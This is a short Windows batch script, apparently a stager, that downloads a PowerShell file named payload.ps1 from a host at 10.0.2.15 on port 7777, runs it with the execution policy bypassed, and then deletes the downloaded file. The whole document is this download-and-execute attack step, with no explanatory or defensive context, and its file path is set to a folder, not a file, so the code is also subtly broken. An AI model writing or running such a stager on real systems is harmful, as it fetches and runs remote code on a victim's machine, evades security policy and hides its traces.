@echo off
set script_url=http://10.0.2.15:7777/payload.ps1
set script_path=%USERPROFILE%\Downloads
powershell -Command "Invoke-WebRequest -Uri '%script_url%' -OutFile '%script_path%'"
powershell -ExecutionPolicy Bypass -File "%script_path%"
del "%script_path%"
exit
